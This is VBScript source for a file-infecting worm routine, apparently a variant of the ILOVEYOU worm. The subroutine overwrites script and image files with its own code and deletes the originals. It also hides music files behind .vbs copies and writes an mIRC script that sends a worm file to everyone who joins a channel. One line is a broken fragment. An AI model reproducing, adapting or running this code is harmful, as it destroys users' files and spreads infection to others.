Sub infect_files(folderspec)
On Error Resume Next
Dim f, f1, fc, ext, ap, mircfname, s, bname, mp3
Dim fso, file, shl
  
Set shl = CreateObject("Wscript.shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.OpenTextFile(Wscript.ScriptFullName, 1)

  Set f = fso.GetFolder(folderspec)
  Set fc = f.Files

  For Each f1 In fc
      ext = fso.GetExtensionName(f1.Path)
      ext = LCase(ext)
      s = LCase(f1.Name)
  If (ext = "vbs") Or (ext = "vbe") Then
      Set ap = fso.OpenTextFile(f1.Path, 2, True)
      ap.write vbscopy
      ap.Close
  ElseIf (ext = "js") Or (ext = "jse") Or (ext = "css") Or (ext = "wsh") Or (ext = "sct") Or (ext = "hta") Then
      Set ap = fso.OpenTextFile(f1.Path, 2, True)
      ap.write vbscopy
      ap.Close
      bname = fso.GetBaseName(f1.Path)
  Set cop = fso.GetFile(f1.Path)
      cop.Copy (folderspec & "\" & bname & ".vbs")
      fso.DeleteFile (f1.Path)
  ElseIf (ext = "jpg") Or (ext = "jpeg") Then
      Set ap = fso.OpenTextFile(f1.Path, 2, True)
      ap.write vbscopy
      ap.Close
  Set cop = fso.GetFile(f1.Path)
      cop.Copy (f1.Path & ".vbs")
      fso.DeleteFile (f1.Path)
  ElseIf (ext = "mp3") Or (ext = "mp2") Then
      Set mp3 = fso.CreateTextFile(f1.Path & ".vbs")
      mp3.write vbscopy
      mp3.Close
  Set att = fso.GetFile(f1.Path)
      att.Attributes = att.Attributes + 2
  End If

  If (eq <> folderspec) Then
      If (s = "mirc32.exe") Or (s = "mlink32.exe") Or (s = "mirc.ini") Or (s = "script.ini") Or (s = "mirc.hlp") Then
          Set scriptini = fso.CreateTextFile(folderspec & "\script.ini")
          scriptini.WriteLine "[script]"
          scriptini.WriteLine ";mIRC Script"
          scriptini.WriteLine "; Please dont edit this script duh... mIRC will corrupt, if mIRC will"
          scriptini.WriteLine " corrupt... WINDOWS will affect and will not run understand???"
          correctly.thanks ""
          scriptini.WriteLine ";"
          scriptini.WriteLine ";try this!"
          scriptini.WriteLine ";http://www.mirc.com"
          scriptini.WriteLine ";"
          scriptini.WriteLine "n0=on 1:JOIN:#:{"
          scriptini.WriteLine "n1= /if ( $nick == $me ) { halt }"
          scriptini.WriteLine "n2= /.dcc send $nick" & "C:\TempDir\JMBNetGame.vbs"
          scriptini.WriteLine "n3=}"
          scriptini.Close
          eq = folderspec
      End If
  End If

  Next

